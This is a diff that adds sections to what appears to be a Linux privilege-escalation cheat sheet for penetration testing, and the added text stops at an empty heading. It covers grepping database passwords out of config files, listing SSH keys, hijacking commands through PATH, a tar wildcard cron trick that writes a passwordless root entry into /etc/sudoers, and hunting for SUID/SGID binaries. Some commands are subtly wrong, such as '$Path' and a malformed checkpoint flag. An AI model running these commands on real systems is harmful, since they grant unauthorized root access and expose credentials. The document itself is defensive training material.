@@ -219,3 +219,73 @@ Running Services by User
 ```bash
 ps aux | grep <user>
 ```
+### Credential Hunting
+
+Web/DB Credentials
+```bash
+cat wp-config.php | grep 'DB_USER\|DB_PASSWORD' # Use on any config files you find in /var
+```
+SSH Keys
+```bash
+ls ~/.ssh
+```
+
+### Path Abuse
+
+```bash
+echo $Path
+# Remember any script or program in a directory specified in the path is executable from any directory on the system
+```
+Add Current Directory to the path
+```bash
+PATH=.:${PATH}
+export PATH
+```
+Script to modify a command in path
+```bash
+touch ls
+echo 'echo "PATH ABUSE"' > ls
+chmod +x ls
+```
+### Wildcard Abuse
+```bash
+*   An Asterisk that can match any number of characters in a file name
+?   Matches a single character
+[]  Brackets close characters and can match any single one at the defined position
+~   Tilde refers to a  home director
+-   a Hyphen with brackets will denote a range of characters
+```
+Simple script to abuse a cron job
+```bash
+echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint =1
+```
+### Escaping Restricted Shells
+
+Command Injection
+```bash
+ls -l 'pwd' # Injected a pwd command into the argument of ls
+```
+Command substitution
+Try executing a command in backticks, etc.
+
+Command Chaining = Try using multiple commands chained together, separated by a pipe or semicolon
+
+ENV Variables
+
+Shell Functions
+
+### Special Permissions
+Look for SUID Bit = Shows as an s in permissions
+
+Find SetGid permission
+```bash
+find / -uid 0 -perm -6000 -type f 2>/dev/null #Can be leveraged the same as SUID binaries
+```
+
+Again, check [GTFOBins](https://gtfobins.github.io)
+
+### Priviliged Groups
+
+
